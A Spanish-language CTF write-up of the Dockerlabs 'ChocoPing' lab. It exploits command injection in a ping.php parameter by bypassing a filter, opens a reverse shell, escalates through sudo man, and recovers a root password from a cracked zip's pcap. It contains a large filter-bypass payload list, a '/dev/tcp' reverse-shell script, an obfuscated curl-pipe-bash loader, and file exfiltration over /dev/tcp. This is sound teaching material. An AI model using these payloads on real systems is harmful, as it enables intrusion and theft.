
# Writeup Template: Maquina `[ ChocoPing ]`

- Tags: #Chocoping #ByPassCommand
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina ChocoPing](https://mega.nz/file/lfkQWbgS#FxS2eYsDcycIBO8emylnIEomBCK5OUJ0QbVE493FDpk) Ejecución remota de comandos con WAF Bypass, cracking .zip, sudoers y análisis de archivo .pcap
### 🛡️ **WAF (Web Application Firewall) en Ciberseguridad**
Un **WAF** (Firewall de Aplicaciones Web) es un sistema de seguridad diseñado específicamente para **proteger aplicaciones web** (sitios, APIs, servicios online) contra ataques cibernéticos. Actúa como un "escudo inteligente" entre los usuarios y la aplicación, filtrando y monitoreando el tráfico HTTP/HTTPS.
### 🔍 **¿Que hace exactamente?**
1. **Bloquea ataques comunes**:
    - **Inyecciones SQL** (`' OR 1=1 --`).
    - **Cross-Site Scripting (XSS)** (`<script>alert('hack')</script>`).
    - **Fuerza bruta** (intentos masivos de login).
    - **Path Traversal** (acceso a archivos críticos como `/etc/passwd`).
    - **DDoS a nivel aplicación** (saturación con peticiones maliciosas).
        
2. **Inspecciona el tráfico**:  
    Analiza cada solicitud/respuesta HTTP(S) usando:
    - **Reglas predefinidas** (firmas de ataques conocidos).
    - **Comportamiento anómalo** (tráfico sospechoso no catalogado).
        
3. **Protección proactiva**:
    - Actualiza reglas automáticamente ante nuevas amenazas.
    - Algunos usan **machine learning** para detectar patrones extraños.
## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x chocoping.zip
sudo bash auto_deploy.sh chocoping.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.62
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```
### Descubrimiento de Rutas
```bash
feroxbuster -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt --scan-dir-listings
```

**Hallazgos Relevantes:**
```bash
200      GET        1l        6w       34c http://172.17.0.2/ping.php
200      GET        1l       12w      188c http://172.17.0.2/icons/blank.gif
200      GET        2l       17w      357c http://172.17.0.2/icons/unknown.gif
200      GET       15l       50w      749c http://172.17.0.2/
```

### Descubrimiento de Archivos
```bash
feroxbuster -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,php.back,backup,txt,sh,hmtl,js,java --scan-dir-listings
```

- **Hallazgos**:
	Reporta lo mismo que en el escaneo anterior

En la web principal nos retorna un mensaje donde nos indica que necesitamos como parametro una direccion **IP**
```bash
Por favor, ingresa una IP válida.
```

Ahora realizamos **fuzzing** para encontrar un parametro en la sigiuente url:
```bash
http://172.17.0.2/ping.php
```

**Fuzzeamos**
```bash
ffuf -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://172.17.0.2/ping.php?FUZZ=/etc/passwd" -fs 34
```

Tenemos un parametro:
```bash
ip                      [Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 3ms]
```

Ahora que tenemos el parametro vamos a probarlo para ver como reaciona la web:
Si probamos apuntando a nuestra interfaz de **Docker**
```bash
http://172.17.0.2/ping.php?ip=172.17.0.1
```

Obtenemos la siguiente respuesta:
```bash
PING 172.17.0.1 (172.17.0.1) 56(84) bytes of data.
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.054 ms
64 bytes from 172.17.0.1: icmp_seq=2 ttl=64 time=0.078 ms
64 bytes from 172.17.0.1: icmp_seq=3 ttl=64 time=0.077 ms
64 bytes from 172.17.0.1: icmp_seq=4 ttl=64 time=0.081 ms

--- 172.17.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3075ms
rtt min/avg/max/mdev = 0.054/0.072/0.081/0.010 ms
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que sabemos que realizar por detras el comando **ping** intentaremos aprovecharnos de eso para intentar escapar un comando:
```bash
http://172.17.0.2/ping.php?ip=172.17.0.1; whoami
```

En la web nos reporta que no esta permitido ese comando, Asi que aplica una validacion para evitar que logremos inyectar comandos:
```bash
Comando no permitido.
```

Lista de comandos probados:
```bash
172.17.0.2/ping.php?ip=172.17.0.1; && whoami
http://172.17.0.2/ping.php?ip=172.17.0.1; || whoami
http://172.17.0.2/ping.php?ip=172.17.0.1;%20||%20whoami
172.17.0.2/ping.php?ip=172.17.0.1; w h o a m i
```

Viendo que valida las entradas recuriremos a un diccionario de coamandos de tipo **bypass** y ese es el que usare:
```bash
# File: command_bypass.txt
# Command Bypass Techniques for Linux/Unix Environments

# Wildcard Character Bypass
/usr/bin/p?ng
nma? -p 80 localhost
/usr/bin/who*mi
/usr/s?in/us?r?update
/c?t/?tc/p?ss?d

# Special Character Handling
touch -- -la
touch ./-la
touch -- --help

# Command Concatenation
/usr/bin/who$(echo ami)
/usr/bin/n[c]
'p'i'n'g
"w"h"o"a"m"i
p\i\n\g
w\h\o\a\m\i
\u\n\a\m\e \-\a
p\
i\
n\
g

# Null Byte and Empty Strings
ech''o test
ech""o test
bas''e64
cat$u /etc$u/passwd$u
p${u}i${u}n${u}g
p$(u)i$(u)n$(u)g
w`u`h`u`o`u`a`u`m`u`i
cat${null}file.txt

# History Recall
!-1
!-2
!-1!-2
!!-a
!-1\-a

# Command Chaining
;uname -a
&id
|sh
||ls
&&cat /etc/passwd

# Brace Expansion
{cat,lol.txt}
{echo,test}
{ls,-la}
{id,;}

# Environment Variables
${SHELL} -c whoami
$0 -c 'echo test'
sh<<<id
bash<<<$(ls)

# IFS Manipulation
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b
IFS=,;`cat<<<cat,/etc/passwd`
echo${IFS}test
X=$'cat\x20/etc/passwd'&&$X
printf$IFS'$IFS\t/etc/passwd\n'|sh

# Alternative Command Paths
/bin/wh$u$uami
/???/b??/whoam?
/usr/*/whoami
./--version

# Encoding/Decoding
echo d2hvYW1p | base64 -d | sh
`echo c2ggLWkgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzQ0NDQgMD4mMQ== | base64 -d`
$(printf "\154\163")

# Variable Injection
cmd=whoami;$cmd
x=wh;y=oami;$x$y
a=l;b=s;$a$b -la

# Special Characters
$'\u0062\u0061\u0073\u0068'
$(tr '!-~' 'P-~!-O' <<< 'Xr]Fz')

# Redirection Bypass
cat</etc/passwd
sh</dev/tcp/attacker.com/443

# Regex Evasion
who$@ami
whoa\mi
wh\oa\mi
w\h\o\a\m\i

# Path Traversal
cat /etc/./passwd
cat /etc/passwd/..
/bin/../bin/whoami

# Multi-Command
echo whoami|$0
echo$IFS$()'ls'|sh
`echo cGF5bG9hZA== | base64 -d`
```

Ahora fuzzeamos para ver si tenemos exito a la hora de ejecutar comando:
```bash
ffuf -u "http://172.17.0.2/ping.php?ip=172.17.0.2;FUZZ" -w command_bypass.txt --enc 'FUZZ:urlencode' -fs 21
```

Resultados:
```bash
%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca [Status: 200, Size: 126, Words: 11, Lines: 2, Duration: 5ms]
w%5Ch%5Co%5Ca%5Cm%5Ci   [Status: 200, Size: 31, Words: 1, Lines: 2, Duration: 4ms]
X%3D%24%27cat%5Cx20%2Fetc%2Fpasswd%27%26%26%24X [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 3ms]
wh%5Coa%5Cmi            [Status: 200, Size: 31, Words: 1, Lines: 2, Duration: 3ms]
whoa%5Cmi               [Status: 200, Size: 31, Words: 1, Lines: 2, Duration: 3ms]
w%5Ch%5Co%5Ca%5Cm%5Ci   [Status: 200, Size: 31, Words: 1, Lines: 2, Duration: 3ms]
p%5C                    [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 2489ms]
i%5C                    [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 3493ms]
p%5Ci%5Cn%5Cg           [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 3496ms]
n%5C                    [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 4510ms]
```
### Ejecucion del Ataque
Ahora realizamos el ataque y vemos que funciona:
```bash
http://172.17.0.2/ping.php?ip=172.17.0.1;w%5Ch%5Co%5Ca%5Cm%5Ci
```

Retornandonos el output del comando **whoami**
```bash
www-data
```

Ahora intentaremos leer el contenido del archivo **passwd** Con Técnicas de bypass para: cat **/etc/passwd**
```bash
 1. c?a*t /?e*tc/?p*a*sswd
 2. 'cat' "/etc" "/passwd"
 3. \c\a\t \/\e\t\c \/\p\a\s\s\w\d
 4. $(cat /etc/passwd)
 5. `cat /etc/passwd`
 6. {cat,/etc,/passwd}
 7. c$ua$ut$u $u/$ue$ut$uc$u $u/$up$ua$us$us$uw$ud
 8. c${u}}a${u}}t${u}} ${u}}/${u}}e${u}}t${u}}c${u}} ${u}}/${u}}p${u}}a${u}}s${u}}s${u}}w${u}}d
 9. cat${IFS}/etc${IFS}/passwd
10. cat<//etc//passwd
11. echo${IFS}Y2F0IC9ldGMvcGFzc3dk${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh
12. x=cat;${x} /etc/passwd
13. echo cat /etc/passwd | sh
14. $'printf${IFS}"\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"' | sh
```

Ninguna ha funcionado: Asi que generaremos una lista de bypass para este archivo con nuestra herramienta en **python3** **commanByPass.py** que genera un diccionario en base a un comando que le pasemos:
```bash
python3 commandByPass.py 'cat /etc/passwd' > passwd_by_pass.txt
```

NO subire todo el diccionario creado para no aburmar pero con este comando logramos ver el contenido del archivo **passwd**
```bash
c\a\t /\e\t\c\/\p\a\s\s\w\d
```

Asi que probamos para ver el contenido del archivo:
```bash
http://172.17.0.2/ping.php?ip=172.17.0.2;c\a\t%20/\e\t\c\/\p\a\s\s\w\d
```

Ahora si que podemos ver el contenido del archivo:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
balutin:x:1000:1000:balutin,,,:/home/balutin:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
tcpdump:x:101:103::/nonexistent:/usr/sbin/nologin
```

Ahora sabemos que existen estos usuarios en el sistema:
```bash
balutin:x:1000:1000:balutin,,,:/home/balutin:/bin/bash
root:x:0:0:root:/root:/bin/bash
```
### Intrusion
Nos ponemos en escucha
```bash
nc -nlvp 443
```

Ahora toca ganar acceso al objetivo, De igual manera usaremos nuestra herramienta para generar un diccionario::
pero primero crearemos un archivo malicioso bajo el nombre **cmd.sh** que contenga una **revershell**:
```bash
#!/bin/bash

bash -i >& /dev/tcp/172.17.0.1/443 0>&1
```

```bash
chmod +x cmd.sh
```

Una ves creado nos montamos un servidor con python3 para que este accesible este script:
```bash
python3 -m http.server 80
```

Ahora para cargar la **revershell** en la maquina victima tendremos que usar nuestra herramienta para **bypassear** nuesto comando y probaremos hasta que logremos ejecutarlo:
```bash
curl -s http://172.17.0.1/cmd.sh | bash
```

**Bypasseamos** el comando y lo almacenamos en un diccionario:
```bash
commandByPass.py 'curl -s http://172.17.0.1/cmd.sh | bash' > reverShell.txt
```

Probamos estos:
```bash
c`u`u`u`r`u`l -s http://172.17.0.1/cmd.sh | bash
cu$(echo rl) -s http://172.17.0.1/cmd.sh | bash
X=$curl\x20-s\x20http://172.17.0.1/cmd.sh\x20|\x20bash'&&$X
echo${IFS}curl -s http://172.17.0.1/cmd.sh | bash
c?u*rl -s http://172.17.0.1/cmd.sh | bash
`echo curl -s http://172.17.0.1/cmd.sh | bash`
IFS=];b=curl]-s]http://172.17.0.1/cmd.sh]|]bash;$b
$'\u0063\u0075\u0072\u006c\u0020\u002d\u0073\u0020\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0037\u0032\u002e\u0031\u0
{curl,-s,http://172.17.0.1/cmd.sh,|,bash}
!-1\-a
x=curl;$x -s http://172.17.0.1/cmd.sh | bash
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
```

Con este tuvimos exito:
```bash
c\u\r\l -\s h\t\t\p\:\/\/\1\7\2\.\1\7\.\0\.\1\/\c\m\d\.\s\h | b\a\s\h
```

Ahora lo ejecutamos para ganar acceso al **target**
```bash
# Reverse shell o acceso inicial
http://172.17.0.2/ping.php?ip=172.17.0.2;c\u\r\l%20-\s%20h\t\t\p\:\/\/\1\7\2\.\1\7\.\0\.\1\/\c\m\d\.\s\h%20|%20b\a\s\h
```

Ya tenemos acceso y desde nuestro servidor python3 se cargo la peticion:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [21/Jun/2025 23:59:08] "GET /cmd.sh HTTP/1.1" 200 -
```

---
## Escalada de Privilegios

###### Usuario `[ www-data ]`:
Listando los permisos de usuario tenemos lo siguiente:
```bash
sudo -l

User www-data may run the following commands on dca6103fc090:
    (balutin) NOPASSWD: /usr/bin/man
```

Explotacion de privilegios:
```bash
sudo -u balutin /usr/bin/man man # Primero ejecutamos este
!/bin/bash # Despues este
```

###### Usuario `[ balutin ]`:
Listando los archivos de este usuario tenemos lo siguiente:
```bash
secretito.zip
```

Si intentamos descomprimirlo nos pedira una contrasena:
```bash
unzip secretito.zip

Archive:  secretito.zip
[secretito.zip] traffic.pcap password: 

skipping: traffic.pcap            incorrect password
```

Como nos pide contrasena tendremos que pasarnos este archivo a nuestra maquina de atacante para realizar un ataque de fuerza bruta:
Verificamos si existe el binario de python en el sistema de la maquina victima:
```bash
which python3
```

Como no existe ahora lo pasaremos de la siguiente manera:
Primero nos ponemos en escucha en nuestra maquina de atacante:
```bash
nc -nlvp 4444 > secretito.zip
```

Ahora desde la maquina victima la transferimos a nuestra maquina:
```bash
cat ~/secretito.zip > /dev/tcp/172.17.0.1/4444
```

Ahora que tenemos en archivo en nuestro equipo de atacante, Usaremos **john** para crackear la contrasena:
```bash
zip2john secretito.zip > hash
```

Despues ejecutamos lo siguiente:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Tenemos la contrasena para ese archivo:
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (secretito.zip/traffic.pcap)
```

Ahora desde la maquina victima volvemos a intentar descomprimir e ingresamos la contrasena:
```bash
nzip secretito.zip 
Archive:  secretito.zip
[secretito.zip] traffic.pcap password:  chocolate
  inflating: traffic.pcap 
```

Ahora revisamos las cadenas legibles para este archivo:
```bash
strings traffic.pcap
```

Tenemos la contrasena de **root**
```bash
POST /login HTTP/1.1
Host: ejemplo.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
username=root&password=secretitosecretazo!
GET /private HTTP/1.1
Authorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE=
Host: ejemplo.com
```

Ahora intentamos migrar como **root**
```bash
# Comando para escalar al usuario: ( root )
su root # ( secretitosecretazo! )
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@dca6103fc090:/home/balutin# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos tecnicas de **bypass** para ejecutar comandos
2. Aprendimos tecnicas de **bypass** para subir un archivo a la maquina victima y ganar acceso
3. Aprendimos a realizar fuerza bruta a un archivo **zip** para obtener datos